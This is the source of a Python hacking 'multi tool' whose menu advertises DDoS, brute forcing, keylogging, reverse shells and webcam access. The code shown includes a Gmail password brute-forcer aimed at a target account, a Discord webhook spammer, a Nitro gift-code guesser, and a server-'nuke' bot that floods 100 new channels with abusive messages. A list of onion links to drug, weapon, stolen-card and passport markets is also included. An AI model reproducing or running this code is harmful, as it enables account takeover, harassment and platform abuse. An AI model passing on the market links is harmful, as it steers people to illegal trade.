# your webhook: put your webook here incase you need later
# mkz script
# WARNING. SCRIPT WILL NOT WORK IF NOT RAN DIRECT .PY, PLEASE USE THE .BAT FILE IN THE DIRECTORY.
import subprocess
import ipaddress
import qrcode
import random
import string
import threading
import discord
import asyncio
import phonenumbers
import requests
import time
import smtplib
import pygame
import keyboard
import webbrowser
import cv2
import sys
import numpy as np  # Needed for transposing the frame
import ctypes
import pygetwindow as gw
import win32gui
import win32con
import re
import json
import platform
import os
import concurrent.futures
import sys
import logging
import socket
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from tqdm import tqdm
from platform import system
from phonenumbers import number_type
from tqdm.auto import tqdm
from os import system
from flask import Flask
from datetime import datetime
from phonenumbers import carrier, timezone, geocoder
from colorama import Fore, Style
from discord.ext import commands


def slow_print(text, delay=0.00005):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    print()

banner1 = """\033[38;2;255;0;0m


                              ██▓     ▒█████   ▄▄▄      ▓█████▄  ██▓ ███▄    █   ▄████                
                              ▓██▒    ▒██▒  ██▒▒████▄    ▒██▀ ██▌▓██▒ ██ ▀█   █  ██▒ ▀█▒               
                              ▒██░    ▒██░  ██▒▒██  ▀█▄  ░██   █▌▒██▒▓██  ▀█ ██▒▒██░▄▄▄░               
                              ▒██░    ▒██   ██░░██▄▄▄▄██ ░▓█▄   ▌░██░▓██▒  ▐▌██▒░▓█  ██▓               
                             ░██████▒░ ████▓▒░ ▓█   ▓██▒░▒████▓ ░██░▒██░   ▓██░░▒▓███▀▒ ██▓     
                              ░ ▒░▓  ░░ ▒░▒░▒░  ▒▒   ▓▒█░ ▒▒▓  ▒ ░▓  ░ ▒░   ▒ ▒  ░▒   ▒  ▒▓▒    
                               ░ ░ ▒  ░  ░ ▒ ▒░   ▒   ▒▒ ░ ░ ▒  ▒  ▒ ░░ ░░   ░ ▒░  ░   ░  ░▒      
                                ░ ░   ░ ░ ░ ▒    ░   ▒    ░ ░  ░  ▒ ░   ░   ░ ░ ░ ░   ░  ░          
                                  ░  ░    ░ ░        ░  ░   ░     ░           ░       ░   ░          
                                            ░                               ░    ░    ░  \033[0m"""

banner2 = """\033[38;2;255;0;0m


                              ██▓     ▒█████   ▄▄▄      ▓█████▄  ██▓ ███▄    █   ▄████                
                              ▓██▒    ▒██▒  ██▒▒████▄    ▒██▀ ██▌▓██▒ ██ ▀█   █  ██▒ ▀█▒               
                              ▒██░    ▒██░  ██▒▒██  ▀█▄  ░██   █▌▒██▒▓██  ▀█ ██▒▒██░▄▄▄░               
                              ▒██░    ▒██   ██░░██▄▄▄▄██ ░▓█▄   ▌░██░▓██▒  ▐▌██▒░▓█  ██▓               
                             ░██████▒░ ████▓▒░ ▓█   ▓██▒░▒████▓ ░██░▒██░   ▓██░░▒▓███▀▒ ██▓  ██▓   
                              ░ ▒░▓  ░░ ▒░▒░▒░  ▒▒   ▓▒█░ ▒▒▓  ▒ ░▓  ░ ▒░   ▒ ▒  ░▒   ▒  ▒▓▒  ▒▓▒   
                               ░ ░ ▒  ░  ░ ▒ ▒░   ▒   ▒▒ ░ ░ ▒  ▒  ▒ ░░ ░░   ░ ▒░  ░   ░  ░▒   ░▒    
                                ░ ░   ░ ░ ░ ▒    ░   ▒    ░ ░  ░  ▒ ░   ░   ░ ░ ░ ░   ░  ░    ░      
                                  ░  ░    ░ ░        ░  ░   ░     ░           ░       ░   ░    ░    
                                            ░                               ░    ░    ░  \033[0m"""

banner3 = """\033[38;2;255;0;0m


                              ██▓     ▒█████   ▄▄▄      ▓█████▄  ██▓ ███▄    █   ▄████                
                              ▓██▒    ▒██▒  ██▒▒████▄    ▒██▀ ██▌▓██▒ ██ ▀█   █  ██▒ ▀█▒               
                              ▒██░    ▒██░  ██▒▒██  ▀█▄  ░██   █▌▒██▒▓██  ▀█ ██▒▒██░▄▄▄░               
                              ▒██░    ▒██   ██░░██▄▄▄▄██ ░▓█▄   ▌░██░▓██▒  ▐▌██▒░▓█  ██▓               
                             ░██████▒░ ████▓▒░ ▓█   ▓██▒░▒████▓ ░██░▒██░   ▓██░░▒▓███▀▒ ██▓  ██▓  ██▓ 
                              ░ ▒░▓  ░░ ▒░▒░▒░  ▒▒   ▓▒█░ ▒▒▓  ▒ ░▓  ░ ▒░   ▒ ▒  ░▒   ▒  ▒▓▒  ▒▓▒  ▒▓▒ 
                               ░ ░ ▒  ░  ░ ▒ ▒░   ▒   ▒▒ ░ ░ ▒  ▒  ▒ ░░ ░░   ░ ▒░  ░   ░  ░▒   ░▒   ░▒  
                                ░ ░   ░ ░ ░ ▒    ░   ▒    ░ ░  ░  ▒ ░   ░   ░ ░ ░ ░   ░  ░    ░    ░   
                                  ░  ░    ░ ░        ░  ░   ░     ░           ░       ░   ░    ░    ░  
                                            ░                               ░    ░    ░  \033[0m"""


frames = [banner1, banner2, banner3]

for _ in range(5):  # Run twice (~6 seconds)
    for banner in frames:
        os.system('cls' if os.name == 'nt' else 'clear')
        print(banner)
        time.sleep(0.2)
        
logo = """
\033[38;2;255;0;0m
                             ███▄ ▄███▓ ██ ▄█▀▒███████▒   ▄▄▄█████▓ ▒█████   ▒█████   ██▓    
                             ▓██▒▀█▀ ██▒ ██▄█▒ ▒ ▒ ▒ ▄▀░   ▓  ██▒ ▓▒▒██▒  ██▒▒██▒  ██▒▓██▒    
                             ▓██    ▓██░▓███▄░ ░ ▒ ▄▀▒░    ▒ ▓██░ ▒░▒██░  ██▒▒██░  ██▒▒██░    
                             ▒██    ▒██ ▓██ █▄   ▄▀▒   ░   ░ ▓██▓ ░ ▒██   ██░▒██   ██░▒██░    
                             ▒██▒   ░██▒▒██▒ █▄▒███████▒     ▒██▒ ░ ░ ████▓▒░░ ████▓▒░░██████▒.               
                              ░ ▒░   ░  ░▒ ▒▒ ▓▒░▒▒ ▓░▒░▒     ▒ ░░   ░ ▒░▒░▒░ ░ ▒░▒░▒░ ░ ▒░▓  ░
                             ░  ░      ░░ ░▒ ▒░░░▒ ▒ ░ ▒       ░      ░ ▒ ▒░   ░ ▒ ▒░ ░ ░ ▒  ░
                              ░         ░ ░░ ░ ░ ░ ░ ░ ░     ░      ░ ░ ░ ▒  ░ ░ ░ ▒    ░ ░   
                               ░   ░  ░     ░ ░                    ░ ░      ░ ░      ░  ░
                                                                                
\033[0m
"""
menu = """
              ____________________________________________________________________________________________________      
              |                                                                                                  |
              |                    welcome to my multi tool, made and designed by mv4                            |      
              |-------------------------------------------------------------------------------------------- V3 --|      
              |              \033[38;2;255;0;0mO\033[38;2;212;0;43mn\033[38;2;170;0;85ml\033[38;2;127;0;128mi\033[38;2;85;0;170mn\033[38;2;42;0;212me \033[38;2;0;255;255mT\033[38;2;0;212;255mo\033[38;2;0;170;255mo\033[38;2;0;127;255ml\033[38;2;0;85;255ms\033[0m                 |                  \033[38;2;255;0;0mD\033[38;2;212;0;43mi\033[38;2;170;0;85ms\033[38;2;127;0;128mc\033[38;2;85;0;170mo\033[38;2;42;0;212mr\033[38;2;0;0;255md \033[38;2;0;255;255mT\033[38;2;0;212;255mo\033[38;2;0;170;255mo\033[38;2;0;127;255ml\033[38;2;0;85;255ms\033[0m                       |      
              |--------------------------------------------------------------------------------------------------|      
              | 1. Ip Lookup                              | 6. Start Discord                                     |      
              | 2. Phone Number Lookup (UK)               | 7. Discord Nitro Generator                           |      
              | 3. Tor Links / eepsites                   | 8. Discord Webhook Deleter                           |      
              | 4. DDOS Tool                              | 9. Discord Webhook Raider                            |      
              | 5. Email Brute Forcer                     | 10. Discord Bot Raider                               |      
              |--------------------------------------------------------------------------------------------------|      
              |                  \033[38;2;255;0;0mR\033[38;2;204;0;51mA\033[38;2;153;0;102mT\033[38;2;102;0;153m'\033[38;2;51;0;204ms\033[0m                    |                      \033[38;2;255;0;0mO\033[38;2;212;0;43mt\033[38;2;170;0;85mh\033[38;2;127;0;128me\033[38;2;85;0;170mr\033[38;2;42;0;212ms\033[0m                          |
              |--------------------------------------------------------------------------------------------------|      
              | 11. Hack Cameras                          | 16. Pirated King Von Software (...)                  |      
              | 12. Fake Malware                          | 17. Wifi Killer                                      |      
              | 13. Key Logger                            | 18. Access webcam                                    |      
              | 14. Phone Controller                      | 19. Run-As Admin                                     |      
              | 15. Reverse Shell Tool                    | 20. Restart Script                                   |      
              ----------------------------------------------------------------------------------------------------
"""



#------------------------------------------------------------------------------------------------------
 #$ettings 

def current_time_hour():
              now = datetime.now()
              return now.strftime("%H:%M:%S")

INFO = Fore.BLUE + Style.BRIGHT
WARNING = Fore.YELLOW + Style.BRIGHT
ERROR = Fore.RED + Style.BRIGHT
INPUT = Fore.CYAN + Style.BRIGHT
RESET = Style.RESET_ALL
WHITE = Fore.WHITE + Style.BRIGHT
RED = Fore.RED + Style.BRIGHT
BEFORE = '[' + Fore.LIGHTBLUE_EX + Style.BRIGHT
AFTER = ']' + Style.RESET_ALL
INFO_ADD = Fore.LIGHTBLUE_EX + Style.BRIGHT
color = Fore.LIGHTMAGENTA_EX
white = Fore.WHITE
red = Fore.RED
reset = Style.RESET_ALL
BOLD = Fore.WHITE
BLUE = Fore.BLUE
GREEN = Fore.GREEN

# Version.
version = "2.0"


def clear_screen():
    if platform.system() == "Windows":
        os.system("cls")
    else:
        os.system("clear")

def is_valid_ip(ip):
    try:
        ipaddress.ip_address(ip)
        return True
    except ValueError:
        return False

# Function to check if domain is valid
def is_valid_domain(domain):
    if not domain or " " in domain:
        return False
    return True


#------------------------------------------------------------------------------------------------------------
def Continue():
                       """Continues the program with a new option."""
                       print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Would you like to look up another number or IP? [y/n]")
                       option = input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} -> {RESET}").lower()
                       if option == 'y':
                           main()
                       elif option == 'n':
                           print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Exiting the program! {RESET}")
                       else:
                           print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Invalid Input !")
                           Continue()


#---------------------------------------------------------------------------------------------------------
def ip_lookup():
                       """Performs IP geolocation lookup."""
                       ip_address = input("Enter IP Address: ").strip()
                       url = f"http://ip-api.com/json/{ip_address}"

                       try:
                           response = requests.get(url)
                           data = response.json()

                           if data['status'] == 'success':
                               print("\n--- IP Lookup Results ---")
                               for key, value in data.items():
                                   print(f"{key.capitalize()}: {value}")
                               print("-------------------------\n")
                           else:
                               print(f"Error: {data.get('message', 'Unknown error occurred')}")
                       except Exception as e:
                           print(f"An error occurred: {e}")
#---------------------------------------------------------------------------------------------------------
def webhook_spammer():
                       """Sends multiple messages to a Discord webhook."""
                       webhook_url = input("Enter your Discord webhook URL: ")
                       message = input("Enter your message: ")
                       try:
                           count = int(input("Enter Number of Times: "))
                       except ValueError:
                           print("Please enter a valid number")
                           return

                       data = {"content": message}
                       sent_count = 0

                       print(f"Sending {count} messages...")
                       for i in range(count):
                           try:
                               response = requests.post(webhook_url, json=data)
                               if response.status_code == 204:
                                   sent_count += 1
                                   print(f"Message {sent_count}/{count} sent successfully!")
                                   asyncio.sleep(0.5)  # Basic rate limit prevention
                               elif response.status_code == 429:  # Rate limit hit
                                   retry_after = response.json().get('retry_after', 1)
                                   print(f"Rate limited, waiting {retry_after} seconds...")
                                   asyncio.sleep(retry_after)
                                   # Retry the message
                                   response = requests.post(webhook_url, json=data)
                                   if response.status_code == 204:
                                       sent_count += 1
                                       print(f"Message {sent_count}/{count} sent successfully!")
                               else:
                                   print(f"Error sending message {i+1}: {response.text}")
                           except Exception as e:
                               print(f"An error occurred: {e}")

                       print(f"\nFinished sending messages. Successfully sent: {sent_count}/{count}")
#---------------------------------------------------------------------------------------------------------
def nitro_check(threads, webhook_url):
                       """Checks and sends Nitro codes using threads."""
                       def generate_nitro():
                           """Generates a random Discord Nitro code."""
                           code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=16))
                           return f"https://discord.gift/{code}"
#---------------------------------------------------------------------------------------------------------
                       def check_nitro(code):
                           api_url = f"https://discord.com/api/v10/entitlements/gift-codes/{code}?with_application=false&with_subscription_plan=true"
                           try:
                               response = requests.get(api_url, timeout=1)
                               if response.status_code == 200:
                                   return True
                           except requests.exceptions.RequestException:
                               pass
                           return False
#---------------------------------------------------------------------------------------------------------
                       def send_to_webhook(code):
                           payload = {"content": f"Valid Nitro Code: {code}"}
                           try:
                               requests.post(webhook_url, json=payload)
                           except requests.exceptions.RequestException as e:
                               print(f"Webhook error: {e}")

#--------------------------------------------------------------------------------------------------------
                       def worker():
                           while True:
                               code = generate_nitro()
                               if check_nitro(code):
                                   print(Fore.GREEN + "Nitro Successfully Mined!: " + code + Style.RESET_ALL)
                                   send_to_webhook(code)
                               else:
                                   print(Fore.RED + "Invalid Nitro: " + Style.RESET_ALL + code)

                       threads_list = []
                       for _ in range(threads):
                           t = threading.Thread(target=worker, daemon=True)
                           threads_list.append(t)
                           t.start()

                       for t in threads_list:
                           t.join()
#---------------------------------------------------------------------------------------------------------

def format_links(links):
                       formatted_links = {}
                       for category, sites in links.items():
                           formatted_links[category] = []
                           for site in sites:
                               formatted_links[category].append(f"[{site}](https://{site})")
                       return formatted_links

#---------------------------------------------------------------------------------------------------------
import sys
import time

def slow_type(text, delay=0.00001):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    print()  # new line

def format_links(data, indent=0):
    output = ""
    for key, value in data.items():
        if isinstance(value, dict):
            output += " " * indent + f"{key}:\n"
            output += format_links(value, indent + 4)
        else:
            output += " " * indent + f"{key}: {value}\n"
    return output

def dark_web_links():
    links = {
        "Search Engine":    {
            "Torch": "http://xmh57jrknzkhv6y3ls3ubitzfqnkrwxhopf5aygthi7d6rplyvk3noyd.onion/",
            "Danex": "http://danexio627wiswvlpt6ejyhpxl5gla5nt2tgvgm2apj2ofrgm44vbeyd.onion/",
            "Sentor": "http://e27slbec2ykiyo26gfuovaehuzsydffbit5nlxid53kigw3pvz6uosqd.onion/",
            "Hidden Answers": "http://answerszuvs3gg2l64e6hmnryudl5zgrmwm3vh65hzszdghblddvfiqd.onion/",
            "riseup searx": "http://ozmh2zkwx5cjuzopui64csb5ertcooi5vya6c2gm4e3vcvf2c2qvjiyd.onion/",
        },
        "Bitcoin Anonymity": {
            "Dark Mixer": "http://y22arit74fqnnc2pbieq3wqqvkfub6gnlegx3cl6thclos4f7ya7rvad.onion/",
            "Mixabit": "http://hqfld5smkr4b4xrjcco7zotvoqhuuoehjdvoin755iytmpk4sm7cbwad.onion/",
            "EasyCoin": "http://mp3fpv6xbrwka4skqliiifoizghfbjy5uyu77wwnfruwub5s4hly2oid.onion/",
            "Onionwallet": "http://p2qzxkca42e3wccvqgby7jrcbzlf6g7pnkvybnau4szl5ykdydzmvbid.onion/",
            "VirginBitcoin": "http://ovai7wvp4yj6jl3wbzihypbq657vpape7lggrlah4pl34utwjrpetwid.onion/",
            "Cryptostamps": "http://lgh3eosuqrrtvwx3s4nurujcqrm53ba5vqsbim5k5ntdpo33qkl7buyd.onion/",
        },
        "DDoS": {
            "Stresser": "http://ecwvi3cd6h27r2kjx6ur6gdi4udrh66omvqeawp3dzqrtfwo432s7myd.onion/",
        },
        "Market": {
            "Deep Market": "http://deepmar4ai3iff7akeuos3u3727lvuutm4l5takh3dmo3pziznl5ywqd.onion/",
            "DrChronic": "http://iwggpyxn6qv3b2twpwtyhi2sfvgnby2albbcotcysd5f7obrlwbdbkyd.onion/",
            "TomAndJerry": "http://rfyb5tlhiqtiavwhikdlvb3fumxgqwtg2naanxtiqibidqlox5vispqd.onion/",
            "420prime": "http://ajlu6mrc7lwulwakojrgvvtarotvkvxqosb4psxljgobjhureve4kdqd.onion/",
            "DeDope": "http://sga5n7zx6qjty7uwvkxpwstyoh73shst6mx3okouv53uks7ks47msayd.onion/",
            "AccMarket": "http://55niksbd22qqaedkw36qw4cpofmbxdtbwonxam7ov2ga62zqbhgty3yd.onion/",
            "Cardshop": "http://s57divisqlcjtsyutxjz2ww77vlbwpxgodtijcsrgsuts4js5hnxkhqd.onion/",
            "Darkmining": "http://jbtb75gqlr57qurikzy2bxxjftzkmanynesmoxbzzcp7qf5t46u7ekqd.onion/",
            "MobileStore": "http://rxmyl3izgquew65nicavsk6loyyblztng6puq42firpvbe32sefvnbad.onion/",
            "EuroGuns": "http://t43fsf65omvf7grt46wlt2eo5jbj3hafyvbdb7jtr2biyre5v24pebad.onion/",
            "UKpassports": "http://3bp7szl6ehbrnitmbyxzvcm3ieu7ba2kys64oecf4g2b65mcgbafzgqd.onion/",
            "ccPal": "http://xykxv6fmblogxgmzjm5wt6akdhm4wewiarjzcngev4tupgjlyugmc7qd.onion/",
            "Webuybitcoins": "http://wk3mtlvp2ej64nuytqm3mjrm6gpulix623abum6ewp64444oreysz7qd.onion/",
            "ASAP Market": {
                "ASAP Market 1": "http://asap4u7rq4tyakf5gdahmj2c77blwc4noxnsppp5lzlhk7x34x2e22yd.onion/",
                "ASAP Market 2": "http://asap2u4pvplnkzl7ecle45wajojnftja45wvovl3jrvhangeyq67ziid.onion/",
                "ASAP Market 3": "http://asap4u2ihsunfdsumm66pmado3mt3lemdiu3fbx5b7wj5hb3xpgmwkqd.onion/",
            },
            "Cannahome": {
                "Cannahome 1": "http://cannabmgae3mkekotfzsyrx5lqg7lj7hgcn6t4rumqqs5vnvmuzsmfqd.onion/",
                "Cannahome 2": "http://cannaczy4w2nwu6d2vi5ugudrs23a4lpto2crxjl2tdvyxncsa7uwaid.onion/",
                "Cannahome 3": "http://cannabmuc64fbglolpkvnmqynsx226pg27rgimfe3gye3emgtgodohqd.onion/",
            },
            "Hydra": "http://hydraclubbioknikokex7njhwuahc2l67lfiz7z36md2jvopda7nchid.onion/",
            "The Versus Project": "http://pqqmr3p3tppwqvvapi6fa7jowrehgd36ct6lzr26qqormaqvh6gt4jyd.onion/",
            "Tor Market": "http://rrlm2f22lpqgfhyydqkxxzv6snwo5qvc2krjt2q557l7z4te7fsvhbid.onion/",
            "Drug Stores": {
                "DCdutchconnectionUK": "http://wbz2lrxhw4dd7h5t2wnoczmcz5snjpym4pr7dzjmah4vi6yywn37bdyd.onion/",
                "CanabisUK": "http://7mejofwihleuugda5kfnr7tupvfbaqntjqnfxc4hwmozlcmj2cey3hqd.onion/",
                "Bitpharma": "http://guzjgkpodzshso2nohspxijzk5jgoaxzqioa7vzy6qdmwpz3hq4mwfid.onion/",
                "EuCanna": "http://n6qisfgjauj365pxccpr5vizmtb5iavqaug7m7e4ewkxuygk5iim6yyd.onion/",
                "Smokeables": "http://kl4gp72mdxp3uelicjjslqnpomqfr5cbdd3wzo5klo3rjlqjtzhaymqd.onion/",
                "WeedShop": "http://marijuanaman43fi4t7el66di7vdpbfyhvkgk4mt7wxkg6erfkv65npy3d.onion/",
            },
            "Cartel": "http://7myb7itqew5ffqftvxjh2k7qxwrh7imavxlpn3fxa32d3rvw32e3s7ad.onion/",
            "Kingdom Market": "http://hdfozcnzivftjokvkdjzl6fhq3c7ltyct6db4efov2w4p7xb6rmhlfqd.onion/",
        },
        "Cooks": {
            "Recipes": "http://7gppr7tlr6twnr2whsqj7scfhdeu37tnhwb5t5kffmrfzzvj7hfgowd.onion/",
        },
        "Torrents": {
            "The Pirate Bay": "http://uj3wazyk5kz5rzs.onion/",
            "1337x": "http://1337xwlc2c8sf3d7.onion/",
        },
        "Social Media": {
            "Foxy": "http://foxy6vayr5g5hwwx.onion/",
        },
        "Wikis": {
            "Hidden Wiki": "http://wikitjerrta4qgz4.onion/",
            "Deep Web Wiki": "http://wikicbtbf7rgjjbqe.onion/",
        },
        "Government": {
            "UK Passport Renewal": "http://3bp7szl6ehbrnitmbyxzvcm3ieu7ba2kys64oecf4g2b65mcgbafzgqd.onion/",
        },
        "Communities": {
            "The Versus Project": "http://pqqmr3p3tppwqvvapi6fa7jowrehgd36ct6lzr26qqormaqvh6gt4jyd.onion/",
        },
        "Educational": {
            "EDU": "http://edu.onion/",
        },
    }
    
    # Format and print slowly
    slow_type(format_links(links))
    
def eepsites():
   eepsites = [
        "10channel.i2p",
        "3chelectricboogaloo.i2p",
        "3chv2.i2p",
        "acetone.i2p",
        "agentoocat.i2p",
        "aqua.i2p",
        "archiv.tutorials.i2p",
        "asshole.i2p",
        "astra.i2p",
        "bandura.i2p",
        "bbergeron.i2p",
        "bibi.i2p",
        "bibis.i2p",
        "bloat.ryona.i2p",
        "blog.torproject.i2p",
        "boerse.i2p",
        "bridges.torproject.i2p",
        "ca.i2pd.i2p",
        "cantonese.i2p",
        "cheapeth.i2p",
        "chitanka.i2p",
        "clownworld.i2p",
        "clubcyberia.i2p",
        "cobalt.idk.i2p",
        "community.i2p",
        "community.torproject.i2p",
        "contact.i2p",
        "cool-website.i2p",
        "corbeau.i2p",
        "cryptoschizoclub.i2p",
        "czllfs.i2p",
        "darkrealm.i2p",
        "dashninja.i2p",
        "dcherukhin.i2p",
        "deurachavich.i2p",
        "digitalsr.i2p",
        "discuss.i2p",
        "dist.torproject.i2p",
        "dkf.i2p",
        "dlf.i2p",
        "donate.torproject.i2p",
        "e8.i2p",
        "echo.idk.i2p",
        "elvn.i2p",
        "enlightfragments.i2p",
        "ff.voice.i2p",
        "fftan.i2p",
        "flibusta.i2p",
        "fluttershy.i2p",
        "flyingdogisland.i2p",
        "foxdickchan.i2p",
        "foxdickfarms.i2p",
        "freefallheavens.i2p",
        "fury.i2p",
        "galladite.i2p",
        "geekcode.i2p",
        "get-monero.i2p",
        "git.agentoocat.i2p",
        "git.i2pd.i2p",
        "git.varikvalefor.i2p",
        "gkd.i2p",
        "hagen.i2p",
        "halfway-neko.i2p",
        "helplinks.i2p",
        "hiddenbooru.i2p",
        "hungryewok.i2p",
        "i2p-mirror.bandura.i2p",
        "i2p-projekt.i2p",
        "i2pcraft.i2p",
        "i2pd.i2p",
        "i2peek-a-boo.i2p",
        "i2pforum.i2p",
        "i2pnews.i2p",
        "i2podisy.i2p",
        "i2pseed.bandura.i2p",
        "identiguy.i2p",
        "idk.i2p",
        "infox.i2p",
        "inmymind.i2p",
        "instantexchange.i2p",
        "irc.acetone.i2p",
        "irc.r4sas.i2p",
        "iskopazi.i2p",
        "itrus.i2p",
        "jbo.varikvalefor.i2p",
        "joshuatshaffer.i2p",
        "k1773r.i2p",
        "kabaos.i2p",
        "keys2.agentoocat.i2p",
        "kkk.i2p",
        "klarheit.i2p",
        "kohlchan.i2p",
        "kor.i2p",
        "lavender.ltgc.i2p",
        "leftychan.i2p",
        "leglasen.i2p",
        "letsdecentralize.i2p",
        "limak.i2p",
        "liorar.i2p",
        "maelstrom.i2p",
        "major.acetone.i2p",
        "major.i2p",
        "makoto.i2p",
        "mangocat.i2p",
        "mayvaneday.i2p",
        "mk16de.bandura.i2p",
        "moneroexplorer.i2p",
        "nadezhda-project.i2p",
        "netbsd.i2p",
        "netstalking.i2p",
        "newsxml.idk.i2p",
        "nex.i2p",
        "nl.i2p",
        "nullnyan.i2p",
        "omitracker.i2p",
        "onionket.i2p",
        "openbsd.i2p",
        "opentracker.dg2.i2p",
        "outproxy.acetone.i2p",
        "p2p-node.i2p",
        "pabloshell.i2p",
        "paste.idk.i2p",
        "paste.r4sas.i2p",
        "phreeroma.i2p",
        "planet.i2p",
        "porest.i2p",
        "prep.i2p",
        "prepper.i2p",
        "preppr.i2p",
        "privacy-handbuch.i2p",
        "privatebin.i2p",
        "programthink.i2p",
        "psy.i2p",
        "reg.i2p",
        "repo.i2pd.i2p",
        "repo.r4sas.i2p",
        "revuo-xmr.i2p",
        "rslight.i2p",
        "ryona.i2p",
        "serien.i2p",
        "seven.i2p",
        "sharefile.i2p",
        "site.get-monero.i2p",
        "smokingfetishtube.i2p",
        "speed-test.i2p",
        "spoika.i2p",
        "sportloto.i2p",
        "srv.itrus.i2p",
        "stackwallet.i2p",
        "streams.darkrealm.i2p",
        "stupidhorses.i2p",
        "support.torproject.i2p",
        "syndie-project.i2p",
        "telegram.i2p",
        "torproject.i2p",
        "tosios.idk.i2p",
        "translate.idk.i2p",
        "trocador.i2p",
        "turn-light-off.i2p",
        "tutorials.i2p",
        "umbra.i2p",
        "vanity-eth.i2p",
        "varikvalefor.i2p",
        "voice.i2p",
        "wotlk.i2p",
        "xeha.i2p",
        "xmr-directory.i2p",
        "xmrid.i2p",
        "xn--80ahmijpip2p.i2p",
        "xsden.i2p",
        "xx.i2p",
        "xxxxpro.i2p",
        "yggdrasil.acetone.i2p",
        "yggdrasil.i2p",
        "yourdomain.i2p",
        "z728.i2p",
        "zeronet.i2p",
        "here are you eepsites. remember all eepsites with .i2p run on I2P Invisable Network."
    ]
    # Format and print slowly
   for site in eepsites:
      slow_type(f"  - {site}")
    
   return eepsites



#---------------------------------------------------------------------------------------------------------
def discordraid():
                       intents = discord.Intents.default()
                       intents.messages = True  
                       intents.message_content = True  
                       bot = commands.Bot(command_prefix="!", intents=intents)

                       @bot.event
                       async def on_ready():
                           print(f"This client has logged in as {bot.user}, attack is battle ready. Use !nuke to nuke!")

                       # Command: !Nuke
                       @bot.command()
                       async def nuke(ctx):
                           guild = ctx.guild
                           if not guild.me.guild_permissions.manage_channels:
                               await ctx.send("I don't have permission to manage channels!")
                               return 

                           confirmation_message = await ctx.send(
                               "Are you sure you want to nuke this server? If it's yours, this CANNOT come back. Reply with yes to confirm."
                           )

                           def check(message):
                               return message.author == ctx.author and message.channel == ctx.channel and message.content.lower() == "yes"

                           try:
                               await bot.wait_for("message", check=check, timeout=30)  
                           except asyncio.TimeoutError:
                               await ctx.send("Confirmation timed out. Canceling the operation.")
                               return

                           await ctx.send("Creating 100 new channels...")
                           created_channels = []
                           for i in range(100):
                               try:
                                   channel = await guild.create_text_channel(name=f"nuked-by-mv4-{i+1}")
                                   created_channels.append(channel)
                                   await asyncio.sleep(0.01)  
                               except discord.Forbidden:
                                   await ctx.send("I don't have permission to create channels.")
                                   return
                               except discord.HTTPException:
                                   await ctx.send("An error occurred while creating channels.")
                                   return

                           hi_message = "\n".join(["FUCK ALL OF YOU, YOUR SERVER HAS BEEN COMPROMISED BY MV4, LEAVE IMMEDIATELY."] * 20)
                           for channel in created_channels:
                               try:
                                   await channel.send(hi_message)
                                   await asyncio.sleep(0.01)  # Prevent rate-limit issues
                               except discord.Forbidden:
                                   await ctx.send(f"I don't have permission to send messages in {channel.mention}.")
                               except discord.HTTPException:
                                   await ctx.send(f"An error occurred while sending messages in {channel.mention}.")
                                   await ctx.send("Server has been successfully compromised, Mission Success")
                                   
                       bot_tokt = input("Bot token: ")
                       bot.run(bot_tokt)

#---------------------------------------------------------------------------------------------------------
def webhook_deleter():
                app = Flask(__name__)

                @app.route('/')
                def home():
                    return '''
                        <html>
                        <head>
                            <title>Discord Webhook Deleter</title>
                            <style>
                                body { font-family: Arial; margin: 40px; text-align: center; }
                                input { padding: 10px; width: 300px; margin: 10px; }
                                button { padding: 10px 20px; background: #5865F2; color: white; border: none; cursor: pointer; }
                            </style>
                        </head>
                        <body>
                            <h1>Discord Webhook Deleter</h1>
                            <form onsubmit="deleteWebhook(); return false;">
                                <input type="text" id="webhook" placeholder="Enter webhook URL" required><br>
                                <button type="submit">Delete Webhook</button>
                            </form>
                            <p id="result"></p>
                            <script>
                                function deleteWebhook() {
                                    const webhook = document.getElementById('webhook').value;
                                    fetch(webhook, { method: 'DELETE' })
                                        .then(response => {
                                            if(response.status === 204) {
                                                document.getElementById('result').innerHTML = 'Webhook deleted successfully!';
                                            } else {
                                                document.getElementById('result').innerHTML = 'Failed to delete webhook.';
                                            }
                                        })
                                        .catch(error => {
                                            document.getElementById('result').innerHTML = 'Error: ' + error;
                                        });
                                }
                            </script>
                        </body>
                        </html>
                        '''

                print("Starting webhook deleter website...")
                app.run(host='0.0.0.0', port=3000)
#----------------------------------------------------------------------------------------------------
def emailbrute():
    file_path = input('Enter the path of passwords file: ')
    pass_file = open(file_path, 'r')
    pass_list = pass_file.readlines()

    def login():
        i = 0
        user_name = input('Enter the target email: ')
        server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
        server.ehlo()
        for password in pass_list:
            i = i + 1
            print(str(i) + '/' + str(len(pass_list)))
            try:
                server.login(user_name, password.strip())  # strip() to remove newlines
                clear_screen()  # Assuming this is for clearing screen
                main()
                print('\n')
                print('[+] This account has been hacked, password: ' + password + ' ^_^')
                break
            except smtplib.SMTPAuthenticationError as e:
                error = str(e)
                if error[14] == '<':
                    system('clear')
                    main()
                    print('[+] This account has been hacked, password: ' + password + ' ^_^')
                    break
                else:
                    print('[!] Password not found => ' + password)

    login()
    
#---------------------------------------------------------------------------------------------------------
#DDoS Menu (this hurt me)
def resolve_domain():
    while True:
        # Prompt user for domain input
        domain = input(f"\n{BLUE}Enter domain name (e.g. example.com):{RESET} ").strip()
        
        # Remove the "http://" or "https://" if present
        if domain.startswith("http://"):
            domain = domain[7:]
        elif domain.startswith("https://"):
            domain = domain[8:]
        
        # Remove any trailing slashes
        domain = domain.rstrip('/')

        # Validate the domain format
        if not is_valid_domain(domain):
            print(f"{RED}Error: Invalid domain format. Please try again.{RESET}")
            continue

        print(f"\nAttempting to resolve {domain}...")
        
        try:
            # Attempt to resolve the domain to an IP address
            ip = socket.gethostbyname(domain)
            print(f"\n{GREEN}Success! IP Address of {domain} is: {ip}{RESET}")
            return ip
        except socket.gaierror:
            print(f"\n{RED}Error: Could not resolve '{domain}'.{RESET}")
            print("This could be due to:")
            print("  - Incorrect domain name")
            print("  - No internet connection")
            print("  - DNS resolution problems")
            
            retry = input("\nTry another domain? (y/n): ")
            if retry.lower() != 'y':
                return None
        except Exception as e:
            print(f"\n{RED}Error: {e}{RESET}")
            retry = input("\nTry another domain? (y/n): ")
            if retry.lower() != 'y':
                return None

